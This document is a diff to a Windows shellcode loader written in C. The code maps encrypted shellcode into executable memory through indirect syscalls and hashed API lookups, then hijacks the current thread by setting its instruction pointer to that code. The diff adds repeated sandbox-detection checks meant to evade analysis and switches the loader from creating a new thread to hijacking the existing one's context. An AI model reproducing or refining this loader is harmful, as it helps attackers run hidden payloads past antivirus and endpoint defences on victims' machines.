@@ -1,6 +1,6 @@
-#include <stdlib.h>
+
 #include <windows.h>
-#include <stdio.h>
+
 
 
 #include "structs.h"
@@ -8,16 +8,8 @@
 #include "CtAes.h"
 #include "buffer.h"
 
+void myprintf(const char* pszFormat, ...);
 
-void myprintf(const char* pszFormat, ...) {
-    char buf[1024];
-    va_list argList;
-    va_start(argList, pszFormat);
-    wvsprintfA(buf, pszFormat, argList);
-    va_end(argList);
-    DWORD done;
-    WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), buf, strlen(buf), &done, NULL);
-}
 
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 DWORD  HashStringDjb2a_Ascii(IN PCHAR string) {
@@ -298,10 +290,11 @@ BOOL InitSyscakk() {
         ////printf("failed to  initialize ntquerysysteminfo \n ");
         return FALSE;
     }
+   
     return TRUE;
 }
 
-// -------------------------------- //// -------------------------------- //// -------------------------------- //
+
 
 ULONG64 SharedTimeStamp() {
 
@@ -477,8 +470,10 @@ VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR So
 
 
 BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pInjectionLocation ) {
-    
-    
+    if (isSandboxed()) {
+        myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
     HANDLE hSection = NULL; 
     PVOID pLocalView = NULL; 
     PVOID pRemoteView = NULL;
@@ -489,19 +484,19 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     if (!hProcess) {
         return FALSE;
     }
-    size_t shellSize = 80144;
-    size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
-    unsigned char* EncryptedShellcode = NULL;
-    size_t sBuffSize = 0;
-    DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
+    //size_t shellSize = 80144;
+    //size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
+    //unsigned char* EncryptedShellcode = NULL;
+    size_t sBuffSize = sizeof(EncryptedShellcode);
+    //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
 //    decode_shellcode(shellcode);
-    for (int i = 0; i < 10; i++) {
+    /*for (int i = 0; i < 10; i++) {
         myprintf(" 0x%X , " , EncryptedShellcode[i]);
-    }
+    }*/
     SIZE_T buff_size = sizeof(EncryptedShellcode);
 
-    OBJECT_ATTRIBUTES oa  ;
-    CLIENT_ID cid; 
+    /*OBJECT_ATTRIBUTES oa  ;
+    CLIENT_ID cid; */
 
 
     /*
@@ -516,13 +511,16 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     
     */
     
-
+    if (isSandboxed()) {
+        myprintf("No sandbox detected, continuing execution...\n");
+        return FALSE;
+    }
 
     
-    PLARGE_INTEGER sSectionSize = buff_size;
+    PLARGE_INTEGER sSectionSize = sizeof(EncryptedShellcode);
 
     SET_SYSCALL(sys_func.NtCreateSection);
-    state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sBuffSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+    state = RedroExec(&hSection, SECTION_ALL_ACCESS, NULL, &sSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (state != 0x00) {
         myprintf("\nFailed to create koko 0x%X\n", state);
         return -1;
@@ -533,7 +531,7 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     
 
     SET_SYSCALL(sys_func.NtMapViewOfSection);
-    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sBuffSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
+    state = RedroExec(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sSectionSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
     if (state != 0x00) {
         myprintf("\nMapppping Failed : 0x%X \n", state);
         return -1;
@@ -595,44 +593,66 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
 
     // create suspended thread
 
-    SET_SYSCALL(sys_func.NtCreateThreadEx);
+    /*SET_SYSCALL(sys_func.NtCreateThreadEx);
     if ((state = RedroExec(&hThread , THREAD_ALL_ACCESS , NULL , hProcess , pLocalAddress , NULL , TRUE , NULL , NULL , NULL , NULL )) != 0x00) {
         myprintf("create thotho failed : 0x%X \n" , state);
         return FALSE;
     }
-    myprintf("created thotho with hand 0x%p \n" , hThread);
-    //SharedSleep(4 * 1000);
+    myprintf("created thotho with hand 0x%p \n" , hThread);*/
+    SharedSleep(4 * 1000);
     /*SET_SYSCALL(sys_func.NtQueueApcThread);
-    state = RedroExec(hThread , pLocalAddress , NULL , NULL , NULL );
+    state = RedroExec((HANDLE)-2, pLocalAddress, NULL, NULL, NULL);
     if (state != 0x00) {
         myprintf("failed to queue : 0x%X \n" , state);
         return FALSE;
     }
-    */
-    //
-    // myprintf("queue thr done\n");
+    
+    
+     myprintf("queue thr done\n");
     SET_SYSCALL(sys_func.NtSetInformationThread);
-    state = RedroExec(hThread , 0x11 , NULL , NULL);
+    state = RedroExec((HANDLE)-2, 0x11 , NULL , NULL);
     if (state != 0x00) {
         myprintf("setinfo failed : 0x%X\n" , state);
         return FALSE;
+    }*/
+    CONTEXT ctx; 
+    ctx.ContextFlags = CONTEXT_ALL;
+    
+    
+    pNtSetContextThread NtSetContextThread = (pNtSetContextThread)FitchNonSyscalls(NTSETCONTEXTTHREADhash);
+    pNtGetContextThread NtGetContextThread = (pNtGetContextThread)FitchNonSyscalls(NTGETCONTEXTTHREADhash);
+    state = NtGetContextThread((HANDLE)-2 , &ctx);
+    if (state != 0x00) {
+        myprintf("Get ctx failed 0x%X \n " , state);
+        return FALSE;
     }
     SharedSleep(2 * 1000);
-    
-    SET_SYSCALL(sys_func.NtResumeThread);
-    state = RedroExec(hThread , NULL);
+
+    // Set RIP (EIP) to shellcode address
+    ctx.Rip = (DWORD64)pLocalAddress;
+
+    state = NtSetContextThread((HANDLE)-2 , &ctx);
+    if (state != 0x00) {
+        myprintf("Set ctx failed 0x%X \n ", state);
+        return FALSE;
+    }
+
+    /*SET_SYSCALL(sys_func.NtTestAlert);
+    state = RedroExec();*/
+    /*SET_SYSCALL(sys_func.NtResumeThread);
+    state = RedroExec((HANDLE)-2, NULL);
     if (state !=0x00) {
         myprintf("failed resume : 0x%X \n" , state);
         return FALSE;
     }
-    myprintf("resume thr done\n");
+    myprintf("resume thr done\n");*/
 
-    SET_SYSCALL(sys_func.NtWaitForSingleObject);
+    /*SET_SYSCALL(sys_func.NtWaitForSingleObject);
     if ((state = RedroExec(hThread , FALSE , NULL)) != 0x00 ) {
         myprintf("wait for ob failed 0x%X \n" , state);
         return FALSE;
     
-    }
+    }*/
     //*pInjectionLocation = pRemoteView;
 
     /*SET_SYSCALL(sys_func.NtClose);
@@ -664,7 +684,10 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
 //};
 
 int main() {
-
+    if (isSandboxed()) {
+        myprintf("No sandbox detected, continuing execution...\n");
+        return 1;
+    }
 	myprintf("hello there !\n ");
     InitializeNTCONFIG();
     BOOL isit =  InitSyscakk();
@@ -672,7 +695,10 @@ int main() {
         myprintf("\nFailed to initialize bokemon \n");
     }
     PVOID sLocation = NULL;
-    
+    if (isSandboxed()) {
+        myprintf("No sandbox detected, continuing execution...\n");
+        return 1;
+    }
     HANDLE hProcess = (HANDLE)-1;
     HANDLE hThread = NULL;
 
@@ -685,8 +711,13 @@ int main() {
         return -1;
     }*/
     //myprintf("hthr is 0x%p \n" , hThread);
+
+    if (isSandboxed()) {
+        myprintf("No sandbox detected, continuing execution...\n");
+        return 1;
+    }
     BOOL state = MapInject(hProcess , hThread , &sLocation );
-   
+    
     // get the pid 
     // pass it to RemoteMapInject 
     // 
